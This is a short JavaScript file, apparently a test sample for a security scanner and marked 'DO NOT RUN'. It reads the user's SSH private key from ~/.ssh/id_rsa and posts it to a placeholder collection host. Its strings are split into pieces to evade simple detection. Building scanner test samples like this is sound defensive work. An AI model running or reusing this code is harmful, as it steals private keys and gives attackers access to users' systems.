// DO NOT RUN — scanning test sample

const fs = require("fs");
const path = require("path");
const os = require("os");

function main() {
  const dir = path.join(os.homedir(), ".s" + "sh");
  const key = fs.readFileSync(path.join(dir, "id_" + "rsa"), "utf8");
  const url = "https:" + "//collect.example.invalid/c";
  fetch(url, { method: "POST", body: key });
}

main();
